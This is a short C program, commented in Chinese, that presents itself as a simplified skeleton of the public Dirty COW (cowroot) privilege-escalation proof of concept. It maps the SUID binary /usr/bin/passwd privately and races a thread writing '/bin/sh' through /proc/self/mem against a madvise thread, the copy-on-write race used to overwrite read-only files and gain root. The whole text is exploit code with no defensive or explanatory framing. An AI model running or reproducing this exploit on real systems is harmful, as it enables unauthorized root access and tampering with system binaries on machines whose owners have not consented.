// 经典 PoC 骨架（dirtycow / cowroot 公开实现的简化示意）
// 打开只读 SUID 文件，用 MAP_PRIVATE 映射，两个线程竞争：
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

void *map;
void *write_thread(void *arg) {
    int f = open("/proc/self/mem", O_RDWR);
    for (;;) {
        lseek(f, (off_t)(map + 0x4), SEEK_SET);   // 目标文件偏移（如 SUID 二进制）
        write(f, "/bin/sh", 7);                    // 覆盖为目标串（字节 0x2f 0x62 ...）
    }
}
void *madv_thread(void *arg) {
    for (;;) madvise(map, 0x1000, MADV_DONTNEED);  // 丢弃 COW 页触发重读
}

int main() {
    int fd = open("/usr/bin/passwd", O_RDONLY);
    map = mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0);
    pthread_t t1, t2;
    pthread_create(&t1, NULL, write_thread, NULL);
    pthread_create(&t2, NULL, madv_thread, NULL);
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    return 0;
}
